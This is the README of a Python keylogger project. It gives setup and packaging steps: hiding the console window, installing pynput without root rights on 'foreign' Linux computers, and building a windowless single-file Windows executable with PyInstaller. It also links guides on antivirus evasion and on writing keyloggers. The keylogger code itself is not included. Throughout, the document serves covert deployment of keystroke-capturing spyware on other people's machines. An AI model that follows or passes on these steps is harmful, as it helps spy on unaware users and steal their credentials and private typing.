# Python 3
## Requirements
Needs to be run in /home/user
pip3 pynput

## Run on Linux
To make sure the console does not appear when running this script save it as a *.pyw file

### Install pynput without root rights for deployment on foreign Linux computers
wget https://bootstrap.pypa.io/get-pip.py && python3 get-pip.py --user
cd .local/bin
./pip install pynput --user

## Pack for Windows
How to pack it with pyinstaller. This has to be done in windows environment.
- Install python3 (not from App Store but from www.python.org) for compatibility use 32bit Version
- Add python to Path in System Variables in Windows (e.g. %APPDATA%\Local\Programs\Python\Python39-32\)


Then go into CMD into this folder:
<code>
python -m pip install virtualenv
python -m pip install pyinstaller #TODO continue from herer on Claudi Laptop
python -m venv env
env\\Scripts\\activate
python -m pip install -r requirements.txt
python -m pip install pyinstaller
python -m PyInstaller --onefile -w -F keylogger-usage.pyw
</code>

After running this you find the error log in 
<code>build/keylogger-usage/warn-keylogger-usage.txt</code>
which have to be inspected and the *.exe file in 
<code>dist/keylogger-usage</code>

https://medium.com/bugbountywriteup/antivirus-evasion-with-python-49185295caf1


## Source
https://nitratine.net/blog/post/python-keylogger/
https://nitratine.net/blog/post/convert-py-to-exe/#pyinstaller